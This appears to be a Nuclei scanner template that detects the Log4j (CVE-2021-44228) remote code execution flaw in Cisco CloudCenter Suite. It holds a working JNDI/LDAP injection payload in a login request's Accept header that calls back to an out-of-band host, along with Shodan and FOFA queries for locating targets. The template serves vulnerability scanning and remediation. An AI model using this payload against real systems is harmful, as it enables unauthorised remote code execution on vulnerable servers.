http:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 2
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: header
    type: word
    words:
    - X-RateLimit-Limit-suite-gateway_suite-auth
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - '@timeout: 10s

    POST /suite-auth/login HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/plain, */${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.accept.{{interactsh-url}}}

    Content-Type: application/json


    {"username":"{{randstr}}@{{randstr}}.com","password":"{{randstr}}","tenantName":"{{randstr}}"}

    '
id: cisco-cloudcenter-suite-log4j-rce
info:
  author: pwnhxl
  classification:
    cve-id: CVE-2021-44228
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: 'Cisco CloudCenter Suite is susceptible to remote code execution via
    the Apache Log4j library. An attacker can execute malware, obtain sensitive information,
    modify data, and/or gain full control over a compromised system without entering
    necessary credentials. Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security
    releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages,
    and parameters do not protect against attacker-controlled LDAP and other JNDI-related
    endpoints. An attacker who can control log messages or log message parameters
    can execute arbitrary code loaded from LDAP servers when message lookup substitution
    is enabled.

    '
  metadata:
    fofa-query: title="CloudCenter Suite"
    max-request: 1
    shodan-query: title:"CloudCenter Suite"
  name: Cisco CloudCenter Suite (Log4j) - Remote Code Execution
  reference:
  - https://logging.apache.org/log4j/2.x/security.html
  - http://www.openwall.com/lists/oss-security/2021/12/10/1
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  remediation: From log4j 2.15.0, this behavior has been disabled by default. From
    version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has
    been completely removed. Note that this vulnerability is specific to log4j-core
    and does not affect log4net, log4cxx, or other Apache Logging Services projects.
  severity: critical
  tags: cve,cve2021,jndi,log4j,rce,oast,cloudcenter,cisco,kev
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'
